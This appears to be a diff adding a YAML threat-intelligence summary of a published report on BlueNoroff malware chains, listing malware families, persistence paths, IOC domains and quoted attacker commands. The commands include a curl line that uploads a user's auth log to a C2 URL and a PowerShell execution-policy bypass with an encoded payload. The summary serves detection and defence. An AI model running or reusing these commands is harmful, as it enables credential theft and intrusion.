@@ -1,0 +1,83 @@
+description: The report describes multiple macOS and Windows malware chains, including
+  a Dropper that decrypts configuration files, a DownTroy downloader, SysPhon, and
+  RooTroy, with various persistence and UAC bypass techniques.
+attribution: BlueNoroff (APT38), South Korea
+malware_families:
+- ZoomClutch
+- DownTroy
+- CosmicDoor
+- RooTroy
+- RealTimeTroy
+- SneakMain
+- SysPhon
+- GillyInjector
+TTPs:
+  processes: []
+  commandline:
+  - rvt4inst <MID> <C2> [<Additional C2 domains...>]
+  - launchctl unload <bundle ID>.plist
+  - launchctl load <bundle ID>.plist
+  - /bin/zsh -c "[command]"
+  powershell:
+  - powershell.exe -executionpolicy bypass -file %temp%\init.ps1
+  - powershell -encodedcommand aQB1AHgATAAOAECAZQBOACBAQWBVAG4AdAB1AG4AdAAgACBAUABhAHQAaAAGACGAJABLAG4AdgA6AFQARQBNAFAAKWA1AFWAaQBUAGKAdAAUAHAACWAXACIAKQAGACBAUGBhAHCAKQA=
+  scripting_engine:
+  - 'bash scripts: upl.sh, cpl.sh, ubd.sh, secrets.sh, uad.sh, utd.sh'
+  - 'curl -s -insecure --connect-timeout 60 -X POST -H "Content-Type:multipart/form-data"
+    -H User-Agent: curl-agent -Ffile=@/Users/<username>/Library/Logs/<username>_auth.log
+    -k <c2_url>'
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: curl
+    destination: https://bots.autoupdate.online:8080/test
+    port: 8080
+  - executable: curl
+    destination: https://writeup.live/test
+    port: null
+  - executable: curl
+    destination: https://api.clearit.sbs/test
+    port: null
+  - executable: curl
+    destination: https://api.flashstore.sbs/test
+    port: null
+  file_activity:
+  - /Library/Google/Cache/.cfg
+  - /Library/Application Support/Logitechs/bin/Update Check/st
+  - /Library/Storage/CPU/cpumons/wt
+  - /private/tmp/[random-chars]{10}.zip
+  - /private/tmp/[random-chars]{10}/install
+  - /private/var/tmp/.confighxxps://bots.autoupdate.online:8080/test
+  - /private/tmp/.confighxxps://writeup.live/test
+  - /private/tmp/.confighxxps://api.clearit.sbs/test
+  - /private/tmp/.confighxxps://api.flashstore.sbs/test
+  persistence:
+  - Launch Daemon plist <bundle ID>.plist
+  - LaunchDaemons/<bundle ID>.plist
+  - LaunchAgents/com.google.update.plist
+  process_relations: []
+IOCs:
+  domains:
+  - file-server.store
+  - cloud-server.store
+  - flashserve.store
+  - chkactive.online
+  - bots.autoupdate.online
+  - writeup.live
+  - api.clearit.sbs
+  - api.flashstore.sbs
+  urls:
+  - hxxps://file-server[.]store/update
+  - hxxps://cloud-server[.]store/update
+  - hxxps://flashserve[.]store/update
+  - hxxps://chkactive[.]online/update
+  - https://bots.autoupdate.online:8080/test
+  - https://writeup.live/test
+  - https://api.clearit.sbs/test
+  - https://api.flashstore.sbs/test
+authors:
+- Sojun Ryu
+- Omar Amin
+reference: https://securelist.com/bluenoroff-apt-campaigns-ghostcall-and-ghosthire/117842
+date_of_publication: October 28, 2025
+file_creation_date: October 30, 2025
